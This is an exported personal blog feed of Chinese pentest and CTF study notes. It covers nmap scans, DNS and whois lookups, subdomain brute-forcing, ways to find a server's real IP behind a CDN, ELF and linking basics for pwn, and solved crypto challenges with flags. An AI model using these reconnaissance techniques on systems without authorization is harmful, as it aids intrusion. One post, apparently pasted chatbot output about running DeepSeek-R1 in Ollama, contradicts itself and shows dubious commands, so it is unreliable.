Linux</p><p><a href="http://testfire.net/">http://testfire.net/</a></p><p>nmap testfire.net           # IBM的一个靶场<br>简单扫描：nmap -sP 192.168.142.133<br>指定端口或范围扫描： nmap -p0-65535 192.168.142.133<br>探测操作系统： nmap -O 192.168.142.133</p><p>【cat &#x2F;proc&#x2F;version】</p><p>只进行主机发现，不进行端口扫描： nmap -sn 192.168.40.195&#x2F;24</p><h6 id="IP后面的-24是什么意思？"><a href="#IP后面的-24是什么意思？" class="headerlink" title="IP后面的&#x2F;24是什么意思？"></a>IP后面的&#x2F;24是什么意思？</h6><p>&#x2F;24含义: IP地址后的&#x2F;24表示子网掩码的位数为24位，即255.255.255.0，属于C类IP地址。</p><p>掩码的位数。<br>子网掩码8位，11111111.00000000.00000000.00000000 代表：255.0.0.0（A类IP地址）<br>子网掩码16位，11111111.11111111.00000000.00000000 代表：255.255.0.0（B类IP地址）<br>子网掩码24位，11111111.11111111.11111111.00000000 代表：255.255.255.0（C类IP地址）<br>旁站：和目标网站在同一台服务器但端口不同的其他网站。<br>C段 ：和目标服务器IP处在同一个C段的其它服务器。</p><h2 id="界面工具Zenmap"><a href="#界面工具Zenmap" class="headerlink" title="界面工具Zenmap"></a>界面工具Zenmap</h2><p>第一种：Intense scan<br>第二种：Intense scan plus UDP<br>第三种：Intense scan,all TCP ports<br>第四种：Intense scan,no ping<br>第五种：Ping scan<br>第六种：Quick scan<br>第七种：Quick scan plus<br>第八种：Quick traceroute<br>第九种：Regular scan<br>第十种：Slow comprehensive scan</p><h1 id="其他扫描工具"><a href="#其他扫描工具" class="headerlink" title="其他扫描工具"></a>其他扫描工具</h1><p>masscan、nbtscan<br><a href="http://coolaf.com/tool/port">在线端口检测,端口扫描,端口开放检查-在线工具-postjson</a></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Test </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/17f7e2087847.html"/>
      <url>/2025/06/17f7e2087847.html</url>
      
        <content type="html"><![CDATA[<p>title: IP信息<br>date: 2025-06-28 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="DNS服务器的类型"><a href="#DNS服务器的类型" class="headerlink" title="DNS服务器的类型"></a>DNS服务器的类型</h1><ul><li>本地域名服务器: 在网络适配器中配置的服务器地址，如114.114.114.114或8.8.8.8，可能是路由器地址。</li><li>根域名服务器: 负责全球域名的解析，如.com、.net等顶级域名的管理。</li><li>顶级域名服务器: 解析我们注册的一级域名（实际上是二级域名，因为.com等才是一级域名）。</li><li>授权域名服务器: 解析三级域名（实际上是四级域名），如blog.wuya.com，知道配置记录指向的IP。</li></ul><h2 id="查询方式："><a href="#查询方式：" class="headerlink" title="查询方式："></a>查询方式：</h2><ul><li>迭代查询: 本地域名服务器依次查询根域名服务器、顶级域名服务器、授权域名服务器。</li><li>递归查询: 本地域名服务器帮助查询，层层返回结果。</li></ul><p><img src="/./../../../images/image-20250629130717006.png" alt="image-20250629130717006"></p><h1 id="ping-nslookup"><a href="#ping-nslookup" class="headerlink" title="ping &#x2F; nslookup"></a>ping &#x2F; nslookup</h1><h2 id="Packet-Internet-Groper（因特网包探索器）："><a href="#Packet-Internet-Groper（因特网包探索器）：" class="headerlink" title="Packet Internet Groper（因特网包探索器）："></a>Packet Internet Groper（因特网包探索器）：</h2><p>用于检测网络通畅性，也可根据域名获得服务器IP。</p><h2 id="nslookup工具"><a href="#nslookup工具" class="headerlink" title="nslookup工具:"></a>nslookup工具:</h2><p>也可用于查询域名对应的IP，可指定查询类型，如MX记录（邮件交换记录）。</p><p>nslookup -type&#x3D;”MX” baidu.com</p><h1 id="IP归属信息"><a href="#IP归属信息" class="headerlink" title="IP归属信息"></a>IP归属信息</h1><p><a href="http://ipwhois.cnnic.net.cn/">http://ipwhois.cnnic.net.cn/</a></p><p><a href="https://www.ip38.com/">iP地址查询 - iP38查询网</a></p><p>进行IP归属查询，可查询IPv4&#x2F;IPv6地址、AS号码、网络名称等信息。</p><p>运营商：显示为”China Mobile Communications Corporation”，即中国移动</p><p>IP段范围：</p><p>地理位置：</p><p>管理联系人：</p><h1 id="如何获取CDN背后的真实IP"><a href="#如何获取CDN背后的真实IP" class="headerlink" title="如何获取CDN背后的真实IP"></a>如何获取CDN背后的真实IP</h1><h2 id="CDN-Content-Delivery-Network-内容分发网络"><a href="#CDN-Content-Delivery-Network-内容分发网络" class="headerlink" title="CDN(Content Delivery Network)内容分发网络"></a>CDN(Content Delivery Network)内容分发网络</h2><h4 id="使用CDN服务-将相同内容部署在多台服务器上，形成源站-多个节点服务器的架构。"><a href="#使用CDN服务-将相同内容部署在多台服务器上，形成源站-多个节点服务器的架构。" class="headerlink" title="使用CDN服务 :将相同内容部署在多台服务器上，形成源站+多个节点服务器的架构。"></a>使用CDN服务 :将相同内容部署在多台服务器上，形成源站+多个节点服务器的架构。</h4><p>优势：</p><ul><li>负载均衡：分摊访问请求，减少单台服务器压力</li><li>加速访问：用户访问最近的节点服务器，缩短物理距离，提升响应速度（如武汉用户访问武汉服务器比北京服务器更快）</li><li>应用案例：淘宝早期就采用CDN技术处理商品图片等静态内容</li></ul><h2 id="实现流程（以阿里云为例）"><a href="#实现流程（以阿里云为例）" class="headerlink" title="实现流程（以阿里云为例）"></a>实现流程（以阿里云为例）</h2><p><a href="https://www.zhihu.com/question/36514327/answer/1604554133">https://www.zhihu.com/question/36514327/answer/1604554133</a></p><ol><li>当终端用户（北京）向<a href="http://www.a.com下的指定资源发起请求时,首先/">www.a.com下的指定资源发起请求时，首先</a><br>向LDNS（本地DNS）发起域名解析请求。</li><li>LDNS检查缓存中是否有<a href="http://www.a.com的ip地址记录.如果有,则直/">www.a.com的IP地址记录。如果有，则直</a><br>接返回给终端用户；如果没有，则向授权DNS查询。</li><li>当授权DNS解析<a href="http://www.a.com时,返回域名cname/">www.a.com时，返回域名CNAME</a><br><a href="http://www.a.tbcdn.com对应ip地址./">www.a.tbcdn.com对应IP地址。</a></li><li>域名解析请求发送至阿里云DNS调度系统，并为请求分配最佳节点<br>IP地址。</li><li>LDNS获取DNS返回的解析IP地址。</li><li>用户获取解析IP地址。</li><li>用户向获取的IP地址发起对该资源的访问请求。</li></ol><h2 id="如何找出真实IP"><a href="#如何找出真实IP" class="headerlink" title="如何找出真实IP"></a>如何找出真实IP</h2><p><img src="/./../../../images/image-20250629133105891.png" alt="image-20250629133105891"></p><p>CDN会隐藏真实服务器IP，需要通过特殊技术手段获取</p><h3 id="1、超级ping"><a href="#1、超级ping" class="headerlink" title="1、超级ping"></a>1、超级ping</h3><h3 id="2、历史DNS"><a href="#2、历史DNS" class="headerlink" title="2、历史DNS"></a>2、历史DNS</h3><p><a href="https://tools.ipip.net/cdn.php">全球 CDN 服务商查询_专业精准的IP库服务商_IPIP</a></p><p><a href="https://sitereport.netcraft.com/">该网站正在运行什么？|网络工艺</a></p><h3 id="3、通过子域名查询IP"><a href="#3、通过子域名查询IP" class="headerlink" title="3、通过子域名查询IP"></a>3、通过子域名查询IP</h3><h3 id="4、国外主机解析"><a href="#4、国外主机解析" class="headerlink" title="4、国外主机解析"></a>4、国外主机解析</h3><p>原理：部分网站未部署海外CDN节点，国外访问可能直连源站</p><p>工具：</p><ul><li><a href="https://www.webpagetest.org/">WebPageTest - 网站性能和优化测试</a></li><li><a href="https://dnscheck.pingdom.com/">网站速度测试 |Pingdom 工具</a></li><li><a href="https://www.host-tracker.com/en">网站正常运行时间监控服务，检查网站是否关闭 - Host-tracker</a></li></ul><h3 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h3>]]></content>
      
      
      <categories>
          
          <category> Penetration Test </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/ef5dd01768e9.html"/>
      <url>/2025/06/ef5dd01768e9.html</url>
      
        <content type="html"><![CDATA[<p>title: 编译流程<br>date: 2025-06-28 20:16:36<br>categories:<br>tags: -编译流程</p><p><img src="/./../../../../../images/image-20250628213150350.png" alt="image-20250628213150350"></p><p>1.<strong>编译 (<code>gcc -S</code>)</strong></p><ul><li><p>将<code>p1.c</code>&#x2F;<code>p2.c</code>转为汇编指令<code>p1.s</code>&#x2F;<code>p2.s</code></p></li><li><p><strong>Pwn关注点</strong>：编译器优化（如<code>-O0</code>禁用优化利于调试）、栈保护（<code>-fno-stack-protector</code>）</p></li><li><pre><code class="language-bash">gcc -S p1.c                # 生成汇编gcc -c p1.s                # 生成目标文件gcc p1.o p2.o -o p         # 链接</code></pre></li></ul><p>2.<strong>汇编 (<code>as</code> 或 <code>gcc -c</code>)</strong></p><ul><li>将汇编代码转为<strong>机器码</strong>，生成目标文件<code>p1.o</code>&#x2F;<code>p2.o</code></li><li><strong>关键特点</strong>：包含代码&#x2F;数据段，但地址未确定（<code>relocatable</code>）</li></ul><p>3.<strong>链接 (<code>ld</code> 或 <code>gcc</code>)</strong></p><ul><li>合并目标文件+静态库(<code>.a</code>)，解析符号地址，生成可执行文件<code>p</code></li><li><strong>Pwn核心</strong>：<ul><li><strong>内存布局</strong>：确定<code>.text</code>(代码)&#x2F;<code>.data</code>(全局变量)&#x2F;<code>.bss</code>(未初始化数据)的虚拟地址</li><li><strong>动态链接</strong>：涉及<code>PLT</code>(过程链接表)&#x2F;<code>GOT</code>(全局偏移表)——<strong>漏洞利用关键跳板！</strong></li></ul></li></ul><p><img src="/./../../../../../images/image-20250628214752807.png" alt="image-20250628214752807"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 二进制文件 </category>
          
          <category> 1-从源代码到可执行文件 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>域名信息收集</title>
      <link href="/2025/06/a2f5477bcf25.html"/>
      <url>/2025/06/a2f5477bcf25.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-域名是什么"><a href="#1-域名是什么" class="headerlink" title="1.域名是什么?"></a>1.域名是什么?</h1><p>用来代替IP，找到网络上的一台计算机</p><p><img src="/./../../../images/image-20250628152826187.png" alt="image-20250628152826187"></p><h1 id="2-域名的分类："><a href="#2-域名的分类：" class="headerlink" title="2.域名的分类："></a>2.域名的分类：</h1><h3 id="国际域名"><a href="#国际域名" class="headerlink" title="国际域名:"></a>国际域名:</h3><p>.com(商业公司);.net(网络服务);.org(组织协会等);.gov(政府部);.edu(教育机构);.mil(军事领域);.int(国际组织)</p><h3 id="国别域名"><a href="#国别域名" class="headerlink" title="国别域名:"></a>国别域名:</h3><p>.CN代表中国，.UK代表英国，.US代表美国</p><h3 id="新顶级域名"><a href="#新顶级域名" class="headerlink" title="新顶级域名:"></a>新顶级域名:</h3><p>biz,info，name，pro，aero,coop, museum..</p><h1 id="3-域名联系人信息"><a href="#3-域名联系人信息" class="headerlink" title="3.域名联系人信息"></a>3.域名联系人信息</h1><p>所属人、邮箱、电话、地址…..</p><p><a href="https://site.ip138.com/dbcha.com/domain.htm">dbcha.com子域名大全 dbcha.com二级域名 dbcha.com域名解析查询</a></p><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p>.com由域名运营商VeriSign 管理</p><p>cn域名由CNNIC 管理</p><h4 id="whois工具"><a href="#whois工具" class="headerlink" title="whois工具"></a>whois工具</h4><p><a href="https://whois.chinaz.com/">https://whois.chinaz.com</a><br><a href="http://whoissoft.com/">http://whoissoft.com</a><br><a href="https://whois.cnnic.cn/WelcomeServlet">https://whois.cnnic.cn/WelcomeServlet</a><br>kali whois命令</p><p><img src="/./../../../images/image-20250629091525995.png" alt="image-20250629091525995"></p><h3 id="域名反查"><a href="#域名反查" class="headerlink" title="域名反查"></a>域名反查</h3><p><a href="http://whois.chinaz.com/reverse">http://whois.chinaz.com/reverse</a></p><h3 id="ICP备案查询"><a href="#ICP备案查询" class="headerlink" title="ICP备案查询"></a>ICP备案查询</h3><h3 id="企业信息查询"><a href="#企业信息查询" class="headerlink" title="企业信息查询"></a>企业信息查询</h3><p>官方渠道：beian.miit.gov.cn</p><p>工具：天眼查、企查查等</p><p>查询方式：输入单位名称&#x2F;域名&#x2F;备案号</p><p>备案号规则：个人唯一，多个网站使用”-1”,”-2”等后缀</p><h1 id="4-子域名信息"><a href="#4-子域名信息" class="headerlink" title="4.子域名信息"></a>4.子域名信息</h1><h3 id="子域名的作用"><a href="#子域名的作用" class="headerlink" title="子域名的作用"></a>子域名的作用</h3><h4 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h4><p>子域名是主域名下的二级域名，格式为”子域名.主域名”，如news.baidu.com</p><h4 id="作用原理："><a href="#作用原理：" class="headerlink" title="作用原理："></a>作用原理：</h4><p>·资源隔离：可将不同服务部署在不同服务器（如news.baidu.com和map.baidu.com指向不同IP）</p><p>·品牌统一：保持同一品牌下的多产品线（如百度新闻、百度地图）</p><p>·零成本扩展：无需额外注册新域名，理论上子域名数量无限制</p><h4 id="对比方案："><a href="#对比方案：" class="headerlink" title="对比方案："></a>对比方案：</h4><p>·子目录方案：如<a href="http://www.baidu.com/news%EF%BC%88%E6%89%80%E6%9C%89%E6%9C%8D%E5%8A%A1%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%EF%BC%8C%E6%80%A7%E8%83%BD%E5%8F%97%E9%99%90%EF%BC%89">www.baidu.com/news（所有服务共享服务器资源，性能受限）</a></p><p>·独立域名方案：如bdnews.com（注册管理成本高）</p><h3 id="怎么查询子域名？"><a href="#怎么查询子域名？" class="headerlink" title="怎么查询子域名？"></a>怎么查询子域名？</h3><h4 id="1、字典猜解："><a href="#1、字典猜解：" class="headerlink" title="1、字典猜解："></a>1、字典猜解：</h4><p>使用常见子名字典（如oa、crm、bbs等前缀）</p><h4 id="2、暴力枚举："><a href="#2、暴力枚举：" class="headerlink" title="2、暴力枚举："></a>2、暴力枚举：</h4><p>从a-z、0-9组合尝试（1位→多位）</p><h4 id="3、技术实现："><a href="#3、技术实现：" class="headerlink" title="3、技术实现："></a>3、技术实现：</h4><p>·端口探测：默认扫描80(http)和443(https)端口</p><p>·状态检测：通过HTTP响应码判断服务可用性（200&#x2F;302为有效）</p><p><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><h1 id="5-域名DNS信息"><a href="#5-域名DNS信息" class="headerlink" title="5.域名DNS信息"></a>5.域名DNS信息</h1><h3 id="1-域名与IP"><a href="#1-域名与IP" class="headerlink" title="1. 域名与IP"></a>1. 域名与IP</h3><h4 id="DNS本质："><a href="#DNS本质：" class="headerlink" title="DNS本质："></a>DNS本质：</h4><p>DNS(Domain Name Server)是将域名映射为IP地址的解析服务，本质是一个记录域名与IP映射关系的分布式数据库。</p><h4 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h4><p>当用户访问域名时，DNS服务会查询其数据库中的映射表，将域名转换为对应的IP地址。</p><h3 id="2-域名解析信息"><a href="#2-域名解析信息" class="headerlink" title="2. 域名解析信息"></a>2. 域名解析信息</h3><h4 id="配置流程："><a href="#配置流程：" class="headerlink" title="配置流程："></a>配置流程：</h4><p>在域名注册商处设置DNS服务器（如DNSPod）</p><p>在DNS服务平台配置具体解析规则</p><p><img src="/./../../../images/image-20250629100748277.png" alt="image-20250629100748277"></p><h4 id="配置示例："><a href="#配置示例：" class="headerlink" title="配置示例："></a>配置示例：</h4><p>@符号代表所有地址</p><p>www代表特定子域名</p><p>一个域名可配置多条不同类型记录</p><h4 id="记录类型"><a href="#记录类型" class="headerlink" title="记录类型"></a>记录类型</h4><p>A记录：是最常用类型，将域名指向一个IPv4地址，如8.8.8.8<br>CNAME：别名记录，将域名指向另一个域名地址，与其保持相同解析(如z.cn跳转到amazon.cn)</p><p>MX：用于邮件服务器，相关参数一般由邮件注册商提供，企业邮箱服务(如腾讯企业邮mxdomain.qq.com）</p><p>TXT：可填写附加文本信息，常用于域名验证<br>NS(name serve)：域名服务器记录，可将指定域名交由其他DNS服务商解析管理(如f1g1ns1.dnspod.net)</p><p>AAAA：将域名指向一个IPv6地址(如ff06:0:0:0:0:0:0:c3)</p><p><a href="https://www.strerr.com/cn/nslookup.html">DNS域名在线查询 - www.strerr.com</a></p><p><a href="https://sitereport.netcraft.com/">该网站正在运行什么？|网络工艺</a></p><p><a href="http://www.jsons.cn/nslookup/">在线域名解析记录检测-在线Nslookup域名解析查询工具</a></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Test </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件格式</title>
      <link href="/2025/06/97ad919e2462.html"/>
      <url>/2025/06/97ad919e2462.html</url>
      
        <content type="html"><![CDATA[<h1 id="ELF文件类型"><a href="#ELF文件类型" class="headerlink" title="ELF文件类型"></a>ELF文件类型</h1><p>1.可执行文件（Executable File）[.exec]:经过链接的、可执行的目标文件，通常也称为程序。</p><p>2.可重定位文件（Relocatable File）（可重定位目标文件）[.rel]:由源代码编译生成，包含编译后的二进制代码和数据，但未完成链接过程，通常以”.o”作为扩展名。</p><p>3.共享目标文件（Shared Object file）[.dyn]:动态链接库文件。可被多个程序共享使用，在运行时加载到内存。</p><h1 id="ELF-文件结构"><a href="#ELF-文件结构" class="headerlink" title="ELF 文件结构"></a>ELF 文件结构</h1><p>ELF 文件通过特定的格式组织数据，主要结构包括：</p><h4 id="1-ELF-文件头（ELF-Header）"><a href="#1-ELF-文件头（ELF-Header）" class="headerlink" title="1. ELF 文件头（ELF Header）"></a><strong>1. ELF 文件头（ELF Header）</strong></h4><ul><li>位于文件起始位置，描述文件的基本属性。</li><li>关键字段：<ul><li><strong>EI_MAGIC</strong>：文件魔数（如<code>0x7F ELF</code>），用于标识 ELF 格式。[7f 45 4c 46即字符串“\177ELF“]</li><li><strong>EI_CLASS</strong>：位数（32 位或 64 位）。</li><li><strong>EI_DATA</strong>：字节序（大端或小端）。</li><li><strong>e_type</strong>：文件类型（可执行文件、共享库等）。</li><li><strong>e_entry</strong>：程序入口地址。</li></ul></li></ul><h4 id="2-程序头表-段表（Program-Header-Table）"><a href="#2-程序头表-段表（Program-Header-Table）" class="headerlink" title="2. 程序头表&#x2F;段表（Program Header Table）"></a><strong>2. 程序头表&#x2F;段表（Program Header Table）</strong></h4><ul><li>描述文件在内存中的布局，用于加载器将文件映射到内存。</li><li>关键字段：<ul><li><strong>p_type</strong>：段类型（如代码段、数据段、动态链接段）。</li><li><strong>p_vaddr</strong>：内存虚拟地址。</li><li><strong>p_filesz</strong>：文件中占用的大小。</li><li><strong>p_memsz</strong>：内存中占用的大小。</li></ul></li></ul><h4 id="3-节头表（Section-Header-Table）"><a href="#3-节头表（Section-Header-Table）" class="headerlink" title="3. 节头表（Section Header Table）"></a><strong>3. 节头表（Section Header Table）</strong></h4><ul><li>描述文件中的各个 “节”（Section），用于链接器处理目标文件。</li><li>常见节类型：<ul><li><strong>.text</strong>：可执行代码段。</li><li><strong>.data</strong>：已初始化的全局变量和静态变量。</li><li><strong>.bss</strong>：未初始化的全局变量和静态变量（运行时自动初始化为 0）。</li><li><strong>.rodata</strong>：只读数据段（如字符串常量）。</li><li><strong>.symtab</strong>：符号表，记录函数和变量的名称、地址等。</li><li><strong>.strtab</strong>：字符串表，存储符号表中的字符串内容。</li></ul></li></ul><h4 id="4-节（Sections）"><a href="#4-节（Sections）" class="headerlink" title="4. 节（Sections）"></a><strong>4. 节（Sections）</strong></h4><ul><li>具体存储代码、数据、元信息的区域，不同类型的 ELF 文件包含的节不同。</li><li>示例：<ul><li>可执行文件：包含<code>.text</code>、<code>.data</code>、<code>.dynamic</code>（动态链接信息）等。</li><li>目标文件：包含<code>.text</code>、<code>.rel.text</code>（代码重定位信息）等。</li></ul></li></ul><p><img src="/./../../../../../images/image-20250629223418086.png" alt="image-20250629223418086"></p><p><img src="/./../../../../../images/image-20250629223515561.png" alt="image-20250629223515561"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 二进制文件 </category>
          
          <category> 2-ELF文件格式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/a0cca283eeaf.html"/>
      <url>/2025/06/a0cca283eeaf.html</url>
      
        <content type="html"><![CDATA[<p>title: 信息收集概览<br>date: 2025-06-28 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="渗透测试的流程"><a href="#渗透测试的流程" class="headerlink" title="渗透测试的流程"></a>渗透测试的流程</h1><h2 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h2><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h2><h3 id="信息收集包括内容"><a href="#信息收集包括内容" class="headerlink" title="信息收集包括内容"></a>信息收集包括内容</h3><h3 id="收集范围："><a href="#收集范围：" class="headerlink" title="收集范围："></a>收集范围：</h3><p>域名信息、IP段、开放的端口、网站架构、文件目录结构、软件版本、WAF、旁站、C段…</p><h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>1.域名相关信息</p><p>2.IP相关信息</p><p>3.端口服务相关信息</p><p>4.指纹识别（CMS&#x2F;CDF&#x2F;WAF）</p><p>5.Google Hacking</p><p>6.目录信息</p><p>7.Git Hack</p>]]></content>
      
      
      <categories>
          
          <category> Penetration Test </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>r1_8b</title>
      <link href="/2025/06/38d795f72413.html"/>
      <url>/2025/06/38d795f72413.html</url>
      
        <content type="html"><![CDATA[<p>系统变量，对系统的所有账户生效，您可以根据情况自己选。点击添加添加，输入变量名OLLAMA_MODELS，变量值输入您放置ollama模型的新地址，我这里放在了E:\ollama\models</p><p><img src="/images/254E7FA0-46F1-4144-B913-C7C3E82AFEBA.png"></p><p><img src="/images/E5D4D6BF-5C2F-450B-BF73-B2076752FB89.png"></p><ol><li>拉取模型</li></ol><blockquote><p>ollama pull deepseek-r1:8b</p></blockquote><ol start="2"><li>运行模型</li></ol><blockquote><p>ollama run deepseek-r1:8b</p></blockquote><h3 id="🔍-Can-I-run-DeepSeek-R1-8B-via-Ollama"><a href="#🔍-Can-I-run-DeepSeek-R1-8B-via-Ollama" class="headerlink" title="🔍 Can I run DeepSeek-R1:8B via Ollama?"></a>🔍 Can I run DeepSeek-R1:8B via Ollama?</h3><p>Currently, <strong>Ollama does not officially support the DeepSeek-R1 8B model</strong> unless it has been added to their<br>repository or community-supported list. You should check:</p><ul><li>The <a href="https://ollama.com/models">Ollama models page</a> for updates.</li><li>Community forums (e.g., GitHub issues) if users have shared custom Docker images&#x2F;definitions.</li></ul><hr><h3 id="🧪-How-to-run-transformer-models-like-DeepSeek-R1-via-Ollama"><a href="#🧪-How-to-run-transformer-models-like-DeepSeek-R1-via-Ollama" class="headerlink" title="🧪 How to run transformer models like DeepSeek-R1 via Ollama"></a>🧪 How to run transformer models like DeepSeek-R1 via Ollama</h3><p>If the model is supported, you can use this command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:8b</span><br></pre></td></tr></table></figure><p>This will:</p><ul><li>Download (if not installed) and load the 8B parameter version of DeepSeek-R1.</li><li>Start a local instance for interactive chat or API access.</li></ul><hr><h3 id="🤔-What-is-DeepSeek-R1-8B"><a href="#🤔-What-is-DeepSeek-R1-8B" class="headerlink" title="🤔 What is DeepSeek-R1:8B?"></a>🤔 What is DeepSeek-R1:8B?</h3><p>DeepSeek-R1 is an advanced transformer language model developed by <a href="https://www.deepseek.com/">深度求索（DeepSeek）</a>. The “8B” refers to <strong>8 billion parameters</strong> in the model. It’s designed for:</p><ul><li>Natural language understanding and generation.</li><li>Code-related tasks (syntax, debugging).</li><li>Knowledge answering.</li><li>Creative writing.</li></ul><hr><h3 id="📄-Example-usage-with-Ollama-CLI"><a href="#📄-Example-usage-with-Ollama-CLI" class="headerlink" title="📄 Example usage with Ollama CLI"></a>📄 Example usage with Ollama CLI</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Start interactive chat (if supported)</span></span><br><span class="line">ollama chat deepseek-r1:8b</span><br><span class="line"></span><br><span class="line"><span class="comment"># Or generate text via API/command line:</span></span><br><span class="line">curl http://localhost:11434/api/generate \</span><br><span class="line">  -X POST \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;model&quot;: &quot;deepseek-r1:8b&quot;,</span></span><br><span class="line"><span class="string">    &quot;prompt&quot;: &quot;Explain quantum computing in simple terms.&quot;,</span></span><br><span class="line"><span class="string">    &quot;stream&quot;: false</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure><hr><h3 id="⚠️-If-the-model-isn’t-supported-yet"><a href="#⚠️-If-the-model-isn’t-supported-yet" class="headerlink" title="⚠️ If the model isn’t supported yet:"></a>⚠️ If the model isn’t supported yet:</h3><p>You can try running it via Docker (if you have technical access):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name deepseek-r1 \</span><br><span class="line">  -p 11434:11434 \</span><br><span class="line">  --<span class="built_in">rm</span> \</span><br><span class="line">  -v ollama_models:/models \</span><br><span class="line">  llamafile/docker-ollama \</span><br><span class="line">  predict DeepSeek-R1 /models/deepseek-r1.tar</span><br></pre></td></tr></table></figure><p>But note: This may not be officially maintained.</p><hr><h3 id="🌟-What-else-can-Ollama-run"><a href="#🌟-What-else-can-Ollama-run" class="headerlink" title="🌟 What else can Ollama run?"></a>🌟 What else can Ollama run?</h3><p>Oll (a) supports models like:</p><ul><li>Llama, Mistral, Mixtral</li><li>GPT models (via LMSYS)</li><li>Gemma, Phi, CodeLlama</li><li>And many others!</li></ul><p>Check the <a href="https://ollama.com/models">current list on their website</a>.</p><hr><p>Let me know if you’d like help with a specific task using DeepSeek-R1 or another model! 😊</p>]]></content>
      
      
      <categories>
          
          <category> Deepseek </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>摩斯电码</title>
      <link href="/2025/06/828dca5ddec2.html"/>
      <url>/2025/06/828dca5ddec2.html</url>
      
        <content type="html"><![CDATA[<p>…. . .-.. .-.. — ..–.- -.-. .-. -.– .–. - —<br>hello_crypto<br>TZCFlag{HELLO_CRYPTO}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 莫尔斯电码(Morse Code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>摩丝</title>
      <link href="/2025/06/21db97fd724d.html"/>
      <url>/2025/06/21db97fd724d.html</url>
      
        <content type="html"><![CDATA[<p>.. .-.. — …- . -.– — ..-<br>iloveyou</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 莫尔斯电码(Morse Code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/358bdb20a0d3.html"/>
      <url>/2025/06/358bdb20a0d3.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 不知道分哪类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>password</title>
      <link href="/2025/06/fbf475443deb.html"/>
      <url>/2025/06/fbf475443deb.html</url>
      
        <content type="html"><![CDATA[<p>姓名：张三<br>生日：19900315<br>key格式为key{xxxxxxxxxx}</p><p>发现如果将张三变为 zs加上它的日期长度刚好符合题目的xx长度，那我们不妨试下：<br>flag{zs19900315}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 不知道分哪类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dancemen</title>
      <link href="/2025/06/cbb71a3305da.html"/>
      <url>/2025/06/cbb71a3305da.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/dancemen.jpg"><br><img src="/images/Pastedimage20250603124314.png"><br>TZCFlag{dancemenareinteresting}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 不知道分哪类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Rabbit 1</title>
      <link href="/2025/06/bf8f92268b07.html"/>
      <url>/2025/06/bf8f92268b07.html</url>
      
        <content type="html"><![CDATA[<p>U2FsdGVkX1&#x2F;+ydnDPowGbjjJXhZxm2MP2AgI<br><img src="/images/8C5ED5D3-48AE-4A5B-94BF-527E062586AC.png"><br><a href="https://www.sojson.com/encrypt_rabbit.html">https://www.sojson.com/encrypt_rabbit.html</a></p>]]></content>
      
      
